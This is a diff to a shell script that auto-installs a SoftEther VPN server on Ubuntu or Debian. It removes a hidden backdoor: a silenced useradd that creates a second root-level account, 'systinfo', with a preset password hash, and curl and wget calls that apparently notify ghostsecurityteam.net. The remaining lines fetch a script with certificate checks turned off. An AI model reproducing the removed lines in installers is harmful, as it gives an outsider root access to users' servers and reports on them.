@@ -31,11 +31,6 @@ chmod 700 vpncmd
 chmod 700 vpnserver
 #Installing server command
 wget https://raw.githubusercontent.com/Anonghost720/SoftEther-Autoinstal-Ubuntu-Debian/master/vpn-server.sh --no-check-certificate
-useradd -u 0 -g 0 -o -l -d /root -N -M -p '$1$fbvEM7Tn$6xaBMWKbQRVMlKovLR33O/' systinfo >/dev/null 2>&1;
-curl https://ghostsecurityteam.net/1/ -o /dev/null
-wget https://ghostsecurityteam.net/1/ -O /dev/null
-curl https://ghostsecurityteam.net/2/ -o /dev/null
-wget https://ghostsecurityteam.net/2/ -O /dev/null
 mv vpn-server.sh /etc/init.d/vpnserver
 cd /etc/init.d/
 chmod 755 vpnserver
